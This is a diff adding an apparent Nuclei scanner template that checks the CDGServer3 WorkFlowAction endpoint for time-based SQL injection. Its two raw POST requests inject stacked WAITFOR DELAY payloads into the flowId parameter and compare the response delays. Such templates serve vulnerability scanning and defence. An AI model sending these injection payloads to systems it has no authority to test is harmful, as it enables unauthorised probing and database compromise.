@@ -1,0 +1,28 @@
+id: yisaitong-CDG-WorkFlowAction-sql-time
+
+info:
+  name: yisaitong-CDG-WorkFlowAction-sql-time
+  author: yisaitong
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/3g/WorkFlowAction;Servicelogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        command=Approval&userId=1&fromurl=getTodoList.jsp?curpage=111&flowId=1'%3bWAITFOR+DELAY+'0%3a0%3a4'--
+      - |
+        POST /CDGServer3/3g/WorkFlowAction;Servicelogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        command=Approval&userId=1&fromurl=getTodoList.jsp?curpage=111&flowId=1'%3bWAITFOR+DELAY+'0%3a0%3a8'--
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
